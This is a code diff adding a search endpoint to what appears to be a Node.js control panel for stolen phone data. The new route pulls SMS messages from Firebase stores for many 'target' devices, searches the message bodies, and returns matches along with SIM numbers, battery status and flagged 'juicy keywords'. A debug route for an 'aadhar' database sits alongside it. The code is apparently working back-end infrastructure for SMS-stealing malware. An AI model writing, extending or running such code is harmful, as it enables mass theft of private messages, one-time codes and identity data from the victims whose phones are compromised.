@@ -1249,7 +1249,86 @@ app.get('/api/alert-devices', (req, res) => {
   res.json({ results, total: results.length });
 });
 
-// ── Debug: dump aadhar DB for a specific URL ──────────────────────────────────
+// ── FindAll: live search SMS bodies across all cached devices ─────────────────
+// This fetches SMS from Firebase for every device, searches body text.
+// To avoid timeouts, searches cached DB first — returns devices where
+// last_activity exists, then does live SMS fetch for matching candidates.
+app.get('/api/findall', async (req, res) => {
+  const q     = (req.query.q || '').trim().toLowerCase();
+  const page  = Math.max(1, parseInt(req.query.page) || 1);
+  const limit = Math.min(100, parseInt(req.query.limit) || 50);
+  if (!q) return res.status(400).json({ error: 'q is required' });
+
+  // Step 1: collect all devices from cache that have any SMS activity
+  // (We only fetch Firebase for devices that have lastActivity — saves time)
+  const candidates = [];
+  for (const target of ALL_TARGETS) {
+    const urlSet = target.isPP ? 'pp' : (target.isOld ? 'old' : 'new');
+    const db = getTargetDb(target);
+    for (const [deviceId, dev] of Object.entries(db)) {
+      if (!dev.last_activity) continue; // skip devices with no SMS history
+      candidates.push({ target, urlSet, deviceId, dev });
+    }
+  }
+
+  // Step 2: fetch SMS for all candidates in parallel (batches of 20)
+  const BATCH = 20;
+  const hits = [];
+  for (let i = 0; i < candidates.length; i += BATCH) {
+    const batch = candidates.slice(i, i + BATCH);
+    const fetched = await Promise.allSettled(batch.map(async ({ target, urlSet, deviceId, dev }) => {
+      const fetchUrl = getSmsLink(target, deviceId, dev.obj_id).replace('?print=pretty', '');
+      // Skip server-proxied URLs for schema 17 — build direct URL instead
+      const actualUrl = fetchUrl.startsWith('/api/')
+        ? null
+        : fetchUrl;
+      if (!actualUrl) return null;
+      try {
+        const smsData = await fbFetch(actualUrl);
+        for (const msg of iterMsgs(smsData)) {
+          const body = String(msg.body || msg.message || msg.msg || msg.text || '');
+          if (body && body.toLowerCase().includes(q)) {
+            return {
+              urlId:        target.id,
+              urlSet,
+              url:          target.url,
+              deviceId,
+              brand:        dev.brand          || 'Unknown',
+              status:       dev.current_status || 'offline',
+              battery:      dev.last_battery   || 'N/A',
+              sim1:         dev.sim1_number    || 'N/A',
+              lastActivity: dev.last_activity  || null,
+              juicyKeywords: (dev.juicy_keywords || []).filter(k => JUICY_KEYWORDS.includes(k)),
+              smsLink:      getSmsLink(target, deviceId, dev.obj_id),
+              matchBody:    body.slice(0, 200), // snippet
+            };
+          }
+        }
+      } catch {}
+      return null;
+    }));
+    for (const r of fetched) {
+      if (r.status === 'fulfilled' && r.value) hits.push(r.value);
+    }
+    // Stop early if we have enough for many pages
+    if (hits.length >= 2000) break;
+  }
+
+  // Sort: online first, then by lastActivity desc
+  hits.sort((a, b) => {
+    if (a.status !== b.status) return a.status === 'online' ? -1 : 1;
+    if (!a.lastActivity && !b.lastActivity) return 0;
+    if (!a.lastActivity) return 1;
+    if (!b.lastActivity) return -1;
+    return a.lastActivity > b.lastActivity ? -1 : 1;
+  });
+
+  const totalResults = hits.length;
+  const totalPages   = Math.ceil(totalResults / limit) || 1;
+  const paged        = hits.slice((page - 1) * limit, page * limit);
+
+  res.json({ results: paged, total: totalResults, page, totalPages, limit, candidates: candidates.length });
+});
 app.get('/api/debug/aadhar/:id', (req, res) => {
   const id  = req.params.id;
   const adb = loadAadharDb();
